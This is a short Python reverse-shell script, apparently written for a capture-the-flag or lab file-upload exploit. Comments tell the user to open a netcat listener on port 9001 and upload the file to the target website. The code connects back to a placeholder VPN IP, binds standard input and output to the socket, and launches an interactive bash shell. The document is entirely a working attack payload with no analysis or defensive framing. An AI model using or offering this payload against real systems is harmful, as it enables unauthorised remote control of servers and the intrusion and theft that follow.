#Its a File Upload vulnerability , so listen on port 9001 with cmd : nc -lvnp 9001 
#save a .py file and upload to the website



import os, socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("Your Open VPN IP", 9001))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])


